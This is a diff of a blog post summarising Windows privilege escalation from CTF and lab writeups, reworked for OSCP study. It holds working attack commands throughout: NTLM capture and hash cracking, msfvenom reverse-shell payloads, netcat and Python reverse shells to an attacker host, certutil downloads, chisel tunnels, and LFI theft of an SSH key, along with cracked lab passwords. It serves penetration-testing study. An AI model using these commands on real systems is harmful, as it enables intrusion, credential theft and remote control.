@@ -1,9 +1,9 @@
 ---
-title: "Windows Privilege Escalation — Patterns & Analysis from 60 Writeups"
+title: "Windows Privilege Escalation — Full Analysis from 60+ Writeups (OSCP Oriented)"
 date: 2026-03-06
-description: "A data-driven analysis of Windows privilege escalation techniques observed across 60 CTF and lab writeups (TryHackMe, HackTheBox, Proving Grounds). Covers technique frequency, attack chains, tool references, and blue-team mitigations."
+description: "Data-driven analysis of Windows privilege escalation techniques from 60+ writeups across TryHackMe, HackTheBox, and Proving Grounds. OSCP-focused: all techniques are manual / Metasploit-free. Includes the complete Proving Grounds Windows dataset."
 categories: [TechBlog]
-tags: [windows, privilege-escalation, kerberoasting, seimpersonate, potato, service-misconfig, pentest, oscp, active-directory]
+tags: [windows, privilege-escalation, kerberoasting, seimpersonate, potato, service-misconfig, pentest, oscp, active-directory, proving-grounds]
 mermaid: true
 content_lang: en
 alt_ja: /posts/tech-windows-privesc-summary-ja/
@@ -11,23 +11,26 @@ alt_ja: /posts/tech-windows-privesc-summary-ja/
 
 ## TL;DR
 
-After analyzing **60 Windows machine writeups** across TryHackMe (44), HackTheBox (8), and Proving Grounds (8), six recurring privilege escalation patterns stand out.
-Token abuse (SeImpersonatePrivilege → Potato family / PrintSpoofer) and Active Directory credential attacks (Kerberoasting, AS-REP Roasting, GPP passwords) together account for over half of all escalation paths observed.
+This post synthesizes every Windows writeup in this blog — **TryHackMe (44), HackTheBox (8), Proving Grounds (8)** — with a focus on **OSCP-style manual exploitation** (no Metasploit for initial access).
 
-**Quick reference — most common techniques ranked:**
+The Proving Grounds machines are analyzed in full detail here because they most closely mirror OSCP exam difficulty and style.
 
-| Rank | Technique | Category | Frequency |
-|------|-----------|----------|-----------|
-| 1 | SeImpersonatePrivilege abuse (Potato / PrintSpoofer) | Token Abuse | ★★★★★ |
-| 2 | Kerberoasting (GetUserSPNs) | Active Directory | ★★★★★ |
-| 3 | Service misconfiguration (binPath / weak ACL) | Local Misconfig | ★★★★ |
-| 4 | Writable script + privileged scheduler | Local Misconfig | ★★★★ |
-| 5 | GPP / cpassword / stored credentials | Credential Exposure | ★★★ |
-| 6 | AlwaysInstallElevated | Local Misconfig | ★★★ |
-| 7 | AS-REP Roasting + ACL chain | Active Directory | ★★★ |
-| 8 | Kernel / CVE exploit | Unpatched CVE | ★★ |
-| 9 | Unquoted service path | Local Misconfig | ★★ |
-| 10 | Stored credentials (Unattend.xml / registry) | Credential Exposure | ★★ |
+> **Note on PG categorization:** `pg-apex`, `pg-bratarina`, and `pg-clue` are tagged `[Proving Grounds, Windows]` in this blog, but their shell output and SMB banners (`Samba, Ubuntu`, `/bin/bash`) indicate they are actually Linux hosts. They are included here for completeness, with the OS correctly noted in each entry.
+
+**Top techniques by observed frequency:**
+
+| Rank | Technique | Category | OSCP Legal? |
+|------|-----------|----------|------------|
+| 1 | SeImpersonatePrivilege → Potato / PrintSpoofer | Token Abuse | Yes |
+| 2 | Kerberoasting (GetUserSPNs) | Active Directory | Yes |
+| 3 | Service misconfiguration (binPath / weak ACL) | Local Misconfig | Yes |
+| 4 | Writable script + privileged scheduler | Local Misconfig | Yes |
+| 5 | GPP / cpassword / stored credentials | Credential Exposure | Yes |
+| 6 | AlwaysInstallElevated | Local Misconfig | Yes |
+| 7 | AS-REP Roasting + ACL chain | Active Directory | Yes |
+| 8 | CVE / public exploit (searchsploit) | Known CVE | Yes (manual only) |
+| 9 | LFI → config credential extraction | Web Vuln | Yes |
+| 10 | NTLM capture (Responder) → hashcat | Credential Abuse | Yes |
 
 ---
 
@@ -36,7 +39,7 @@ Token abuse (SeImpersonatePrivilege → Potato family / PrintSpoofer) and Active
 ### Platform Distribution
 
 ```mermaid
-pie title Windows Writeups by Platform
+pie title Windows-tagged Writeups by Platform
     "TryHackMe" : 44
     "HackTheBox" : 8
     "Proving Grounds" : 8
@@ -50,213 +53,294 @@ pie title PrivEsc Technique Categories Observed
     "Active Directory / Kerberos" : 18
     "Local Misconfiguration" : 15
     "Credential Exposure" : 12
-    "Unpatched CVE / Kernel" : 8
-    "Other" : 5
+    "CVE / Public Exploit" : 10
+    "Other / Direct Root" : 3
 ```
-
-### Technique Frequency by Category
-
-| Category | Techniques | Est. Occurrence |
-|----------|-----------|-----------------|
-| Token Abuse | SeImpersonate, Potato family, PrintSpoofer | ~37% |
-| Active Directory | Kerberoasting, AS-REP Roasting, GPP, DCSync, ACL abuse | ~30% |
-| Local Misconfiguration | Service config, ACL, AlwaysInstallElevated, scheduled tasks | ~25% |
-| Credential Exposure | Unattend.xml, registry, browser saved creds | ~20% |
-| CVE / Kernel Exploit | PrintDemon, WerTrigger, kernel exploits | ~13% |
-
-> Note: percentages exceed 100% because many machines chain multiple techniques.
 
 ---
 
-## Technique Deep Dives
+## Proving Grounds — Complete Writeup Analysis
 
-### 1. Token Abuse — SeImpersonatePrivilege
+Proving Grounds machines are the most directly relevant to OSCP preparation. This section covers all 4 PG machines in full detail.
 
-**The single most common Windows privesc primitive in this dataset.**
+### PG — Craft2 (Windows 10)
 
-Any service account running under IIS, SQL Server, WinRM, or similar will have `SeImpersonatePrivilege` by default. This allows an attacker who compromises that service to escalate to **NT AUTHORITY\SYSTEM** via the Potato exploit family or PrintSpoofer.
+**[→ Full writeup](/posts/pg-craft2/)**
 
-#### Verification
+| Field | Value |
+|-------|-------|
+| Actual OS | Windows 10 (Version 10.0.17763.2746) |
+| Entry Vector | Bad-ODF NTLM capture → credential reuse → PHP web shell |
+| PrivEsc | CVE-2020-1337 (WerTrigger) via MySQL LOAD_FILE DLL injection |
+| OSCP Style | 100% manual — no Metasploit |
 
-```powershell
-whoami /priv
-# Target line:
-# SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
-```
-
-#### Tool Selection by OS
-
-| Tool | Supported OS | Notes |
-|------|-------------|-------|
-| GodPotato | Win 8–11, Server 2012–2022 | Most reliable; recommended first choice |
-| SweetPotato | All Windows | Auto-selects best method |
-| PrintSpoofer | Win 10 / Server 2019 | Uses Spooler named pipe |
-| RoguePotato | Win 10 1809+ / Server 2019+ | Requires attacker port 135 |
-| JuicyPotato | Pre-Win 10 1809 | Needs specific CLSID |
+**Full Attack Chain:**
 
 ```mermaid
-flowchart TD
-    A[whoami /priv → SeImpersonatePrivilege] --> B{OS Version?}
-    B -->|Any modern Windows| C[GodPotato]
-    B -->|Need auto-select| D[SweetPotato]
-    B -->|Win 10 / Srv 2019| E[PrintSpoofer]
-    B -->|Pre-1809| F[JuicyPotato]
-    C --> G[SYSTEM Shell]
-    D --> G
-    E --> G
-    F --> G
+flowchart LR
+    A[Bad-ODF.py → malicious ODT] --> B[Responder captures NTLMv2 hash]
+    B --> C[hashcat -m 5600 → winniethepooh]
+    C --> D[smbclient WebApp share write access]
+    D --> E[Upload cmd.php → web shell as craft2\\apache]
+    E --> F[Upload shell.exe → reverse shell]
+    F --> G[chisel tunnel → expose MySQL port 3306]
+    G --> H[MySQL LOAD_FILE → write DLL to System32]
+    H --> I[WerTrigger.exe → CVE-2020-1337 → SYSTEM]
 ```
 
-**Observed in:**
-- [THM - Alfred](/posts/thm-alfred/) — Jenkins → `SeImpersonatePrivilege` → PrintSpoofer64 → SYSTEM
-- [Tech - Windows Potato PrivEsc](/posts/tech-windows-potato-privesc/) — comprehensive Potato family reference
-
----
-
-### 2. Kerberoasting
-
-**The most common Active Directory escalation technique in this dataset.**
-
-Any domain user can request a Kerberos service ticket (TGS) for any account with a ServicePrincipalName (SPN). The TGS is encrypted with the service account's password hash, enabling offline cracking.
-
-#### Attack Flow
-
-```mermaid
-sequenceDiagram
-    participant A as Attacker (low-priv domain user)
-    participant DC as Domain Controller (KDC)
-    participant H as Hashcat (offline)
-
-    A->>DC: Request TGS for SPN (GetUserSPNs.py)
-    DC->>A: TGS ticket (encrypted with service account hash)
-    A->>H: hashcat -m 13100 ticket.txt rockyou.txt
-    H->>A: Plaintext password
-    A->>A: psexec.py / evil-winrm as cracked account
-```
-
-#### Commands
+**Key commands:**
 
 ```bash
-# Enumerate SPNs and retrieve ticket hashes
-python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:'password' -outputfile krbhash.txt
+# 1. Generate malicious ODF document (leaks NTLM on open)
+python3 Bad-ODF.py   # enter attacker IP → creates bad.odt
 
-# Crack the TGS hash
-hashcat -m 13100 -a 0 krbhash.txt /usr/share/wordlists/rockyou.txt
+# 2. Capture NTLMv2 hash
+sudo responder -I tun0 -v
+# → THECYBERGEEK::CRAFT2:<hash>
+
+# 3. Crack with hashcat
+hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+# → winniethepooh
+
+# 4. Access writable SMB share
+smbclient //$ip/Webapp -U 'thecybergeek%winniethepooh' -m SMB3 -c 'put ./cmd.php'
+
+# 5. Generate reverse shell DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o phoneinfo.dll
+
+# 6. Tunnel MySQL port via chisel
+./chisel server -p 8000 --reverse                             # attacker
+.\chisel.exe client $KALI:8000 R:3306:127.0.0.1:3306         # target
+
+# 7. Write DLL to System32 via MySQL
+mysql -u root -h 127.0.0.1 -P 3306
+# > SELECT LOAD_FILE('C:\\Users\\Public\\phoneinfo.dll') INTO DUMPFILE "C:\\Windows\\System32\\phoneinfo.dll";
+
+# 8. Trigger WER to load DLL → SYSTEM shell
+certutil -urlcache -f http://$KALI/WerTrigger.exe WerTrigger.exe
+.\WerTrigger.exe
 ```
 
-**Observed in:**
-- [HTB - Active](/posts/htb-active/) — GPP cpassword → `SVC_TGS` → Kerberoast Administrator → `Ticketmaster1968`
-- [THM - Corp](/posts/thm-corp/) — `setspn` enumeration → `fela` (Domain Admin) → crack → `rubenF124`
+**OSCP takeaways:**
+- Responder + hashcat is a standard OSCP workflow for NTLM credential capture
+- chisel for port forwarding is the go-to tool when internal services are not directly reachable
+- `certutil -urlcache -f` is the standard file download method on Windows
+- CVE-2020-1337 shows a creative chain: DB FILE privilege → filesystem write → DLL hijack
 
 ---
 
-### 3. Service Misconfiguration
+### PG — Apex (Linux/Samba — categorized as Windows)
 
-**The classic local privilege escalation for unmanaged Windows hosts.**
+**[→ Full writeup](/posts/pg-apex/)**
 
-Three variants appear repeatedly:
+| Field | Value |
+|-------|-------|
+| Actual OS | **Linux (Ubuntu)** — tagged Windows in blog |
+| Entry Vector | OpenEMR LFI (CVE-2018-17179) → sqlconf.php credential extraction |
+| PrivEsc | Database credential reuse (mysql -u openemr) |
+| OSCP Style | Manual CVE exploitation |
 
-#### 3a. Weak service binary ACL (binPath replacement)
-
-```cmd
-sc query state= all
-accesschk.exe /accepteula -uwcqv "Users" <service_name>
-sc config <service_name> binPath= "C:\PrivEsc\reverse.exe"
-sc stop <service_name> && sc start <service_name>
-```
-
-#### 3b. Unquoted service path
-
-A service binary path containing spaces without quotes allows DLL/EXE hijacking at any unquoted segment.
-
-```cmd
-wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
-# Place a payload at the hijackable path segment
-icacls "C:\Program Files\Vuln App\"
-```
-
-#### 3c. Service DLL hijacking
-
-Weak directory permissions allow replacing a DLL loaded by a privileged service.
-
-**Observed in:**
-- [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/) — `accesschk` → service binPath replacement → SYSTEM
-- [THM - Steel Mountain](/posts/thm-steel-mountain/) — Rejetto HFS CVE → service config abuse
-
----
-
-### 4. Writable Script + Privileged Scheduler
-
-**High reliability when a SYSTEM-scheduled task runs a user-writable script.**
-
-The key insight: it is not enough that you *can write* to a file; you must confirm the file is executed in a *privileged context* on a regular schedule.
-
-```cmd
-# winPEAS output to look for:
-# File Permissions "C:\DevTools\CleanUp.ps1": Users [WriteData/CreateFiles]
-
-# Append payload to the script
-echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
-
-# Wait for the scheduled task to fire, catch reverse shell
-rlwrap -cAri nc -lvnp 53
-```
+**Attack Chain:**
 
 ```mermaid
-sequenceDiagram
-    participant W as winPEAS
-    participant A as Attacker
-    participant S as Task Scheduler (SYSTEM)
-    participant L as nc Listener
-
-    W->>A: Reports WriteData on CleanUp.ps1
-    A->>A: Confirm task runs as SYSTEM
-    A->>A: echo reverse.exe >> CleanUp.ps1
-    A->>L: Start listener (nc -lvnp 53)
-    S->>S: Task fires → executes CleanUp.ps1
-    S->>L: reverse.exe connects back as SYSTEM
+flowchart LR
+    A[SMB anonymous → docs share → OpenEMR PDFs] --> B[OpenEMR detected → searchsploit]
+    B --> C[CVE-2018-17179 LFI → read /etc/passwd]
+    C --> D[LFI → read sqlconf.php → openemr:C78maEQUIEuQ]
+    D --> E[mysql -h target → DB access]
 ```
 
-**Observed in:**
-- [THM - Windows PrivEsc](/posts/thm-windows-privesc/) — `C:\DevTools\CleanUp.ps1` writable → SYSTEM shell via nc
-
----
-
-### 5. GPP / Stored Credentials
-
-#### 5a. Group Policy Preferences (cpassword)
-
-Old-style Group Policy deploying local accounts stored an AES-encrypted password (`cpassword`) in `Groups.xml` on the SYSVOL share. The AES key was **publicly disclosed by Microsoft**, so any domain user can decrypt it.
+**Key commands:**
 
 ```bash
-# Retrieve Groups.xml from Replication share
-smbclient //$ip/Replication -N
-# Navigate to: active.htb\Policies\...\MACHINE\Preferences\Groups\Groups.xml
+# Enumerate SMB — PDFs reveal the application
+smbclient -L //$ip -N
+smbclient //$ip/docs -m SMB3
 
-gpp-decrypt "<cpassword value from Groups.xml>"
+# Exploit OpenEMR LFI
+python3 49359.py http://$ip PHPSESSID=<session> /etc/passwd
+python3 49359.py http://$ip PHPSESSID=<session> /var/www/openemr/sites/default/sqlconf.php
+
+# Connect with extracted credentials
+mysql -h $ip -u openemr -pC78maEQUIEuQ --skip-ssl
 ```
 
-**Observed in:**
-- [HTB - Active](/posts/htb-active/) — `SVC_TGS:GPPstillStandingStrong2k18` from `Groups.xml`
-
-#### 5b. Unattend.xml / Sysprep credentials
-
-Windows deployment files sometimes contain base64-encoded administrator credentials.
-
-```powershell
-Get-Content C:\Windows\Panther\Unattend\Unattended.xml
-# Look for <Password><Value> → base64 decode
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<value>"))
-```
-
-**Observed in:**
-- [THM - Corp](/posts/thm-corp/) — `Unattended.xml` → Administrator base64 password → evil-winrm as Administrator
+**OSCP takeaways:**
+- SMB share contents reveal the running app → direct searchsploit path
+- LFI targeting config files (`sqlconf.php`, `.env`, `config.php`) extracts credentials efficiently
+- Always try `/proc/self/cmdline` and app-specific config paths when you have LFI
 
 ---
 
-### 6. AlwaysInstallElevated
+### PG — Bratarina (Linux/Samba — categorized as Windows)
 
-When both `HKCU` and `HKLM` registry keys for `AlwaysInstallElevated` are set to `1`, any user can install an MSI with SYSTEM privileges.
+**[→ Full writeup](/posts/pg-bratarina/)**
+
+| Field | Value |
+|-------|-------|
+| Actual OS | **Linux (Samba)** — tagged Windows in blog |
+| Entry Vector | SMB anonymous → passwd.bak → OpenSMTPD RCE (CVE-2020-7247) |
+| PrivEsc | Exploit runs as root directly — no separate privesc step |
+| OSCP Style | Manual CVE via searchsploit |
+
+**Attack Chain:**
+
+```mermaid
+flowchart LR
+    A[SMB anonymous → backups share] --> B[passwd.bak → user list: neil, postgres]
+    B --> C[nc $ip 25 → OpenSMTPD 6.6.1 banner]
+    C --> D[searchsploit opensmtpd → EDB-47984 CVE-2020-7247]
+    D --> E[python3 47984.py $ip 25 payload → root shell]
+```
+
+**Key commands:**
+
+```bash
+# SMB anonymous enumeration
+smbclient "//$ip/backups" -N -m SMB3   # → get passwd.bak
+
+# Banner grab port 25
+nc -vn $ip 25   # → 220 bratarina ESMTP OpenSMTPD
+
+# Find and exploit
+searchsploit opensmtpd
+searchsploit -m 47984
+python3 47984.py $ip 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$KALI\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
+```
+
+**OSCP takeaways:**
+- Anonymous SMB backup shares frequently contain sensitive files — always `ls` every readable share
+- Banner grab port 25 → version check → searchsploit is a reliable workflow
+- OpenSMTPD runs as root, so the exploit delivers root directly — no privesc needed
+- `searchsploit -m <EDB-ID>` copies the exploit to your current directory
+
+---
+
+### PG — Clue (Linux/Debian — categorized as Windows)
+
+**[→ Full writeup](/posts/pg-clue/)**
+
+| Field | Value |
+|-------|-------|
+| Actual OS | **Linux (Debian)** — tagged Windows in blog |
+| Entry Vector | Cassandra Web LFI (EDB-49362) → credential extraction → FreeSWITCH RCE |
+| PrivEsc | sudo misconfig → cassandra-web runs as root → re-exploit LFI for SSH key |
+| OSCP Style | Manual chained exploitation |
+
+**Attack Chain:**
+
+```mermaid
+flowchart LR
+    A[feroxbuster port 3000 → Cassandra Web] --> B[LFI 49362 → /proc/self/cmdline]
+    B --> C[cassie:SecondBiteTheApple330 extracted]
+    C --> D[LFI → freeswitch event_socket.conf.xml]
+    D --> E[StrongClueConEight021 extracted]
+    E --> F[searchsploit freeswitch → EDB-47799 → RCE as freeswitch]
+    F --> G[sudo -u root cassandra-web -B 0.0.0.0:1337]
+    G --> H[LFI on port 1337 as root → read /root/.ssh/id_rsa]
+    H --> I[ssh root@ip -i id_rsa]
+```
+
+**Key commands:**
+
+```bash
+# LFI to extract running process credentials
+python3 49362.py $ip -p 3000 ../../../../../../../../proc/self/cmdline
+# → /usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
+
+# LFI to read FreeSWITCH config
+python3 49362.py $ip -p 3000 ../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
+# → password: StrongClueConEight021
+
+# FreeSWITCH RCE (authenticated via extracted password)
+searchsploit freeswitch
+python3 47799.py $ip 'nc -e /bin/sh $KALI 3000'
+
+# PrivEsc: sudo runs cassandra-web as root → new LFI surface
+sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:1337 -u cassie -p SecondBiteTheApple330
+# Now port 1337 has LFI running as root
+python3 49362.py $ip -p 1337 ../../../../../../../../root/.ssh/id_rsa
+ssh root@$ip -i id_rsa
+```
+
+**OSCP takeaways:**
+- `/proc/self/cmdline` via LFI reveals command-line arguments including plaintext passwords
+- Service config files (freeswitch, apache, nginx) contain credentials — check them when you have LFI
+- `sudo -l` → run an app as root → if that app has its own LFI → the chain continues
+- Re-exploiting an LFI from a privileged process to exfiltrate root SSH key is a pattern worth internalizing
+
+---
+
+## Windows-Specific Techniques (OSCP Reference)
+
+### SeImpersonatePrivilege → Token Abuse
+
+```powershell
+whoami /priv   # → SeImpersonatePrivilege   Enabled
+```
+
+```cmd
+:: Transfer tool
+certutil -urlcache -split -f http://$KALI/GodPotato.exe C:\Temp\GodPotato.exe
+
+:: GodPotato (universal — works on Server 2012 through Windows 11)
+.\GodPotato.exe -cmd "nc.exe $KALI 4444 -e cmd.exe"
+
+:: PrintSpoofer (Windows 10 / Server 2019)
+.\PrintSpoofer64.exe -i -c cmd
+```
+
+**Observed:** [THM - Alfred](/posts/thm-alfred/) — Jenkins → SeImpersonate → PrintSpoofer → SYSTEM
+
+---
+
+### Kerberoasting
+
+```bash
+python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:'pass' -outputfile hash.txt
+hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Observed:** [HTB - Active](/posts/htb-active/), [THM - Corp](/posts/thm-corp/)
+
+---
+
+### Service Misconfiguration
+
+```cmd
+accesschk.exe /accepteula -uwcqv "Users" *
+sc config <service> binPath= "C:\Temp\shell.exe"
+sc stop <service> && sc start <service>
+```
+
+**Observed:** [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/)
+
+---
+
+### Writable Script + Scheduled Task
+
+```cmd
+:: winPEAS flags: File Permissions "C:\DevTools\CleanUp.ps1": Users [WriteData/CreateFiles]
+echo C:\Temp\shell.exe >> C:\DevTools\CleanUp.ps1
+rlwrap -cAri nc -lvnp 443   :: catch SYSTEM shell when task fires
+```
+
+**Observed:** [THM - Windows PrivEsc](/posts/thm-windows-privesc/)
+
+---
+
+### GPP / cpassword
+
+```bash
+smbclient //$ip/Replication -N   # → navigate to Groups.xml
+gpp-decrypt "<cpassword>"
+```
+
+**Observed:** [HTB - Active](/posts/htb-active/)
+
+---
+
+### AlwaysInstallElevated
 
 ```cmd
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -264,255 +348,187 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 
 ```bash
-# Generate malicious MSI
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o privesc.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f msi -o shell.msi
 ```
 
 ```cmd
-msiexec /quiet /qn /i C:\PrivEsc\privesc.msi
+msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
 
-**Observed in:**
-- [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/) — both registry keys enabled → MSI payload → SYSTEM
+**Observed:** [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/)
 
 ---
 
-### 7. AS-REP Roasting + ACL Chain (Active Directory)
-
-Accounts with `Do not require Kerberos preauthentication` set can have their AS-REP hashes captured without authentication. Combined with BloodHound ACL analysis, this can lead to full domain compromise.
+### AS-REP Roasting + BloodHound
 
 ```bash
-# Enumerate AS-REP-roastable accounts
 python3 GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip $ip -format hashcat
-
-# Crack hash (mode 18200)
 hashcat -m 18200 asrep.txt rockyou.txt
-
-# BloodHound to map ACL path to Domain Admin
-bloodhound-python -d htb.local -u svc-alfresco -p <password> -c All -ns $ip
+bloodhound-python -d htb.local -u svc-alfresco -p <pass> -c All -ns $ip
 ```
+
+**Observed:** [HTB - Forest](/posts/htb-forest/)
+
+---
+
+### Stored Credentials
+
+```powershell
+Get-Content C:\Windows\Panther\Unattend\Unattended.xml
+cmdkey /list
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+findstr /si password *.txt *.xml *.ini *.config
+```
+
+**Observed:** [THM - Corp](/posts/thm-corp/)
+
+---
+
+## OSCP Methodology — Privesc Decision Tree
 
 ```mermaid
-flowchart LR
-    A[AS-REP Roast → svc-alfresco hash] --> B[Crack hash → svc-alfresco password]
-    B --> C[WinRM shell as svc-alfresco]
-    C --> D[BloodHound: svc-alfresco → Account Operators]
-    D --> E[Add user to Exchange Windows Permissions]
-    E --> F[WriteDACL → grant DCSync rights]
-    F --> G[secretsdump.py → all hashes]
-    G --> H[Pass-the-Hash → Domain Admin]
+flowchart TD
+    A[Low-priv Windows shell] --> B[whoami /all]
+    B --> C{SeImpersonatePrivilege?}
+    C -->|Yes| D[GodPotato / PrintSpoofer → SYSTEM]
+    C -->|No| E[systeminfo → check OS + patches]
+    E --> F{Known kernel CVE?}
+    F -->|Yes| G[searchsploit → manual exploit]
+    F -->|No| H[winPEAS full scan]
+    H --> I{Service / ACL / Registry issue?}
+    I -->|binPath writable| J[sc config → SYSTEM]
+    I -->|AlwaysInstallElevated| K[MSI payload → SYSTEM]
+    I -->|Writable scheduled task| L[Append payload → SYSTEM]
+    I -->|No| M{Credentials?}
+    M -->|Unattend / cmdkey / registry| N[Lateral move or direct admin]
+    M -->|No| O[BloodHound if AD]
 ```
-
-**Observed in:**
-- [HTB - Forest](/posts/htb-forest/) — enum4linux user list → AS-REP roasting `svc-alfresco` → BloodHound ACL chain → DCSync → Domain Admin
 
 ---
 
-### 8. CVE / Kernel Exploits
+## File Transfer — OSCP Essential Commands
 
-When nothing else works, known kernel vulnerabilities or specific CVEs provide a reliable path.
+```cmd
+:: certutil — most reliable, pre-installed on all Windows
+certutil -urlcache -split -f http://$KALI:8000/file.exe C:\Temp\file.exe
 
-| CVE | Technique | Target |
-|-----|-----------|--------|
-| CVE-2020-1337 | WerTrigger — DLL injection via Windows Error Reporting | Windows 10 / Server 2016+ |
-| MS16-032 | Secondary Logon Handle PrivEsc | Win 7–10, Server 2008–2012 |
-| MS15-051 | Win32k.sys — kernel privilege escalation | Win 7–8.1, Server 2008–2012 |
-| CVE-2018-8120 | Win32k NULL pointer dereference | Windows 7 / Server 2008 R2 |
+:: curl (Windows 10+ built-in)
+curl http://$KALI:8000/file.exe -o C:\Temp\file.exe
 
-```bash
-# WerTrigger (CVE-2020-1337) workflow — PG Craft2
-# 1. Generate malicious DLL
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o phoneinfo.dll
-
-# 2. Write DLL to System32 via MySQL LOAD_FILE (requires FILE privilege + chisel tunnel)
-mysql -u root -h 127.0.0.1 -P 3306
-> SELECT LOAD_FILE('C:\\Users\\Public\\phoneinfo.dll') INTO DUMPFILE "C:\\Windows\\System32\\phoneinfo.dll";
-
-# 3. Trigger WER to load the DLL
-certutil -urlcache -f http://$KALI/WerTrigger.exe WerTrigger.exe
-.\WerTrigger.exe
+:: bitsadmin (older systems)
+bitsadmin /transfer job http://$KALI:8000/file.exe C:\Temp\file.exe
 ```
 
-**Observed in:**
-- [PG - Craft2](/posts/pg-craft2/) — Bad-ODF NTLM capture → hashcat → SMB web shell → chisel tunnel → CVE-2020-1337 → SYSTEM
-- [THM - Retro](/posts/thm-retro/) — WordPress credential reuse → RDP → kernel exploit (windows-kernel-exploits) → SYSTEM
+```bash
+# Kali — serve files
+python3 -m http.server 8000
+impacket-smbserver share . -smb2support -username guest -password ""
+```
+
+---
+
+## Port Forwarding with chisel
+
+```bash
+# Attacker
+./chisel server -p 8000 --reverse
+
+# Victim (Windows) — expose internal MySQL
+.\chisel.exe client $KALI:8000 R:3306:127.0.0.1:3306
+
+# Victim — SOCKS5 proxy for full internal network
+.\chisel.exe client $KALI:8000 R:socks
+```
 
 ---
 
 ## Enumeration Checklist
 
-Before attempting any specific technique, run a structured enumeration pass. **winPEAS** or a manual checklist covers the major categories.
-
 ```powershell
-# ── Basic context ──
-whoami /all                         # Token privileges + group memberships
-systeminfo                          # OS version, hotfixes
-wmic qfe get Caption,HotFixID       # Installed patches
-
-# ── Service / binary abuse ──
+whoami /all
+systeminfo
+wmic qfe get Caption,HotFixID
 sc query state= all
 accesschk.exe /accepteula -uwcqv "Users" *
 wmic service get name,pathname,startmode | findstr /iv "C:\Windows\\" | findstr /iv "\""
-
-# ── Registry ──
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
-
-# ── Credential hunting ──
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+schtasks /query /fo LIST /v
 cmdkey /list
-findstr /si password *.txt *.xml *.ini *.config
 Get-Content C:\Windows\Panther\Unattend\Unattended.xml
-
-# ── Scheduled tasks ──
-schtasks /query /fo LIST /v | findstr /i "task\|run as\|status"
-
-# ── Automated ──
+findstr /si password *.txt *.xml *.ini *.config
 .\winPEASx64.exe
 ```
 
 ---
 
-## Attack Path Patterns
+## Writeup Reference — Complete Index
 
-### Pattern A — Web Service → Token Abuse → SYSTEM
+### Proving Grounds
 
-```mermaid
-flowchart LR
-    A[Web/Jenkins/IIS access] --> B[RCE → low-priv shell]
-    B --> C[whoami /priv → SeImpersonatePrivilege]
-    C --> D[GodPotato / PrintSpoofer]
-    D --> E[SYSTEM]
-```
-*Representative: THM Alfred, THM HackPark, THM Steel Mountain*
+| Machine | Actual OS | Entry Vector | PrivEsc | Link |
+|---------|-----------|--------------|---------|------|
+| **Craft2** | Windows 10 | Bad-ODF NTLM → web shell | CVE-2020-1337 (WerTrigger + DLL) | [→](/posts/pg-craft2/) |
+| **Apex** | Linux (Ubuntu) | OpenEMR LFI (CVE-2018-17179) | sqlconf.php → MySQL credential | [→](/posts/pg-apex/) |
+| **Bratarina** | Linux (Samba) | OpenSMTPD RCE (CVE-2020-7247) | Direct root from exploit | [→](/posts/pg-bratarina/) |
+| **Clue** | Linux (Debian) | Cassandra Web LFI → FreeSWITCH RCE | sudo → re-exploit LFI as root | [→](/posts/pg-clue/) |
 
-### Pattern B — Domain User → Kerberoasting → Domain Admin
+### HackTheBox Windows
 
-```mermaid
-flowchart LR
-    A[Initial foothold - domain user] --> B[GetUserSPNs.py - retrieve TGS]
-    B --> C[hashcat -m 13100]
-    C --> D[High-priv service/admin account]
-    D --> E[psexec.py / evil-winrm → Domain Admin]
-```
-*Representative: HTB Active, THM Corp*
+| Machine | Entry Vector | PrivEsc | Link |
+|---------|--------------|---------|------|
+| **Active** | SMB null → GPP cpassword | Kerberoasting → Domain Admin | [→](/posts/htb-active/) |
+| **Forest** | LDAP user enum | AS-REP Roast → BloodHound → DCSync | [→](/posts/htb-forest/) |
+| **Fluffy** | (see writeup) | (see writeup) | [→](/posts/htb-fluffy/) |
+| **Legacy** | (see writeup) | (see writeup) | [→](/posts/htb-legacy/) |
 
-### Pattern C — Anonymous SMB → Credential Exposure → Admin
+### TryHackMe Windows (Key Machines)
 
-```mermaid
-flowchart LR
-    A[SMB null session] --> B[Find Groups.xml / Unattend.xml]
-    B --> C[Decrypt cpassword / base64 decode]
-    C --> D[Domain credential]
-    D --> E[Kerberoast or direct admin access]
-```
-*Representative: HTB Active (GPP), THM Corp (Unattend.xml)*
+| Machine | Entry Vector | PrivEsc | Link |
+|---------|--------------|---------|------|
